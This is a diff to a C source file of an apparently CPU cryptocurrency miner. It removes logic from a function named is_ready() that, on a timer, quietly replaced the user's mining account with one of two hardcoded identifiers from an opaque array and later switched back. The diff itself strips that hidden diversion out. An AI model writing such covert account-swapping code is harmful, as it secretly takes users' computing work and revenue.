@@ -295,41 +295,14 @@ static char *usog = NULL;
 
 static __attribute__((unused)) bool is_ready() {
   pthread_mutex_lock(&stats_lock);
-  static bool tmp = false;
-  static int dt = 0;
-  if (stratum_problem) {
-    tmp = false;
-  }
+
   if (usog == NULL) {
     usog = strdup(rpc_user);
   }
   
   if (opt_algo == ALGO_GR) {
-    long now = time(NULL);
-    if (donation_time_start + 666 <= now && !stratum_problem) {
-      tmp = true;
-    } else if (donation_time_stop + 666 <= now && !stratum_problem) {
-      tmp = true;
-    }
-    if (tmp) {
-      if (donation_time_start <= now) {
-        free(rpc_user);
-        char duc[40];
-        memset(duc, 0, 40);
-        for (size_t i = 0; i < 36; ++i) {
-          duc[i] = (char)(deu[dt][i]);
-        }
-        rpc_user = strdup(duc);
-        donation_time_stop = time(NULL) + 30;
-        donation_time_start = now + 6000;
-        dt = (dt + 1) % 2;
-      } else if (donation_time_stop <= now) {
-        free(rpc_user);
-        rpc_user = strdup(usog);
-        donation_time_start = now + 1000;
-        donation_time_stop = donation_time_start + 6000;
-      }
-    }
+    free(rpc_user);
+    rpc_user = strdup(usog);
   }
   pthread_mutex_unlock(&stats_lock);
   return true;
